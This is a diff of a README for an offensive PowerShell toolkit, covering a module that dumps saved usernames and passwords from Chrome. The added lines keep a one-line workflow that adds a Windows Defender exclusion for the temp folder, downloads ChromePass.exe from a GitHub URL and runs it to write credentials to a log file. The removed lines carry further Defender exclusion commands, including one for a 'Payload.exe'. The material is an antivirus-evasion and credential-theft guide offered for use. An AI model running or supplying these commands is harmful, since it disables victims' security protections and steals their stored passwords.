@@ -49,7 +49,7 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-B
    
 |Binary Name|Description|Privileges|Notes|
 |---|---|---|---|
-|ChromePass|dumps usernames, passwords from chrome|Administrator|Invoke-Exclusions.ps1 - Evade AV\Download PE\Exec PE|
+|ChromePass|dumps usernames, passwords from chrome|Administrator|[Invoke-Exclusions.ps1](https://github.com/r00t-3xp10it/redpill/tree/main/lib/WD-Bypass#module-name) - Evade AV\Download PE\Exec PE|
 
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-bypass/Invoke-Exclusions.ps1" -OutFile "Invoke-Exclusions.ps1"
@@ -70,29 +70,13 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-byp
 ```
 
 ```powershell
-#Get full module information
-Get-help .\Invoke-Exclusions.ps1 -Force
-
 #Get Exclusions List
 .\Invoke-Exclusions.ps1 -action "query"
 
-
-#Set-MpPreference -ExclusionExtension "exe" -Force
-.\Invoke-Exclusions.ps1 -action "add" -type "ExclusionExtension" -Exclude "exe"
-
-#Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
-.\Invoke-Exclusions.ps1 -action "add" -type "ExclusionPath" -Exclude "$Env:TMP"
-
-#Set-MpPreference -ExclusionProcess "C:\Users\pedro\AppData\Local\Temp\Payload.exe" -Force
-.\Invoke-Exclusions.ps1 -action "add" -type "ExclusionProcess" -Exclude "$Env:TMP\Payload.exe"
-
-
-## Add exclusion + download URI PE + execute PE
-#Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
+## Add WD exclusion (To execute ChromePass.exe) + download URI (ChromePass.exe)  + execute (ChromePass.exe)
+# exclusion cmdline: Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
 .\Invoke-Exclusions.ps1 -action "exec" -type "ExclusionPath" -Exclude "$Env:TMP" -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe" -Arguments "/stext credentials.log"
 
-
-#Remove-MpPreference -ExclusionProcess "$Env:TMP\Payload.exe" Force
-.\Invoke-Exclusions.ps1 -action "del" -type "ExclusionProcess" -Exclude "$Env:TMP\Payload.exe"
-
+#Remove ExclusionPath "$Env:TMP" from Windows Defender list
+.\Invoke-Exclusions.ps1 -action "del" -type "ExclusionPath" -Exclude "$Env:TMP"
 ```
